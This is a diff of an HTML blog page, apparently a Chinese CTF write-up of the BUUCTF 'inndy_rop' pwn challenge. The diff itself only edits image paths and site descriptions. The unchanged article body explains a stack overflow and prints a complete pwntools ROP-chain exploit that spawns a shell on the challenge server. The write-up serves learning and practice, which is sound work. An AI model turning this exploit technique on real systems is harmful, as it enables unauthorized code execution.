@@ -29,15 +29,15 @@
 <meta property="og:site_name" content="网络幻影">
 <meta property="og:description" content="IDA打开  没有任何可以利用的东西（如system,&#x2F;bin&#x2F;sh,put,write等）  就只有一个get函数，存在栈溢出。  所以我们只能自己来构造rop链利用ROPgadget可以直接构造 1ROPgadget --binary rop --ropchain    写exp 12345678910111213141516171819202122232425262728">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/1.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/2.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/3.png">
+<meta property="og:image" content="http://linkpwn.github.io/BUUCTF-inndy-rop-rop%E9%93%BE/1.png">
+<meta property="og:image" content="http://linkpwn.github.io/BUUCTF-inndy-rop-rop%E9%93%BE/2.png">
+<meta property="og:image" content="http://linkpwn.github.io/BUUCTF-inndy-rop-rop%E9%93%BE/3.png">
 <meta property="article:published_time" content="2025-02-24T13:46:03.000Z">
 <meta property="article:modified_time" content="2025-09-23T12:32:15.000Z">
 <meta property="article:author" content="linkpwn">
-<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta property="article:tag" content="ctf学习, 编程学习, 游戏, 日常">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://linkpwn.github.io/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/1.png">
+<meta name="twitter:image" content="http://linkpwn.github.io/BUUCTF-inndy-rop-rop%E9%93%BE/1.png">
 
 <link rel="canonical" href="http://linkpwn.github.io/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/">
 
@@ -106,7 +106,7 @@
       <h1 class="site-title">网络幻影</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <p class="site-subtitle" itemprop="description">linkpwn</p>
       <a>
         <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
       </a>
@@ -200,7 +200,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -263,7 +263,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="IDA打开"><a href="#IDA打开" class="headerlink" title="IDA打开"></a>IDA打开</h2><p><img src="/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/1.png" alt="1"></p>
+        <h2 id="IDA打开"><a href="#IDA打开" class="headerlink" title="IDA打开"></a>IDA打开</h2><p><img src="/./BUUCTF-inndy-rop-rop%E9%93%BE/1.png" alt="1"></p>
 <ol>
 <li><p>没有任何可以利用的东西（如system,&#x2F;bin&#x2F;sh,put,write等）</p>
 </li>
@@ -272,12 +272,12 @@
 <li><p>所以我们只能自己来构造rop链<br>利用ROPgadget可以直接构造</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/2.png" alt="2"></p>
+<p><img src="/./BUUCTF-inndy-rop-rop%E9%93%BE/2.png" alt="2"></p>
 </li>
 <li><p>写exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26568</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload</span>():</span><br><span class="line">    <span class="comment"># 将初始字符串转换为 bytes</span></span><br><span class="line">    p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span> + <span class="number">4</span>)</span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span>  <span class="comment"># 字符串需要转换为 bytes</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>)  <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>)  <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span>  <span class="comment"># 字符串需要转换为 bytes</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>)  <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>)  <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>)  <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>)  <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">shell = payload()</span><br><span class="line">r.sendline(shell)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/3.png" alt="3"></p>
+<p><img src="/./BUUCTF-inndy-rop-rop%E9%93%BE/3.png" alt="3"></p>
 </li>
 </ol>
 
@@ -386,7 +386,7 @@
     <img class="site-author-image" itemprop="image" alt="linkpwn"
       src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">linkpwn</p>
-  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+  <div class="site-description" itemprop="description">linkpwn的学习记录</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
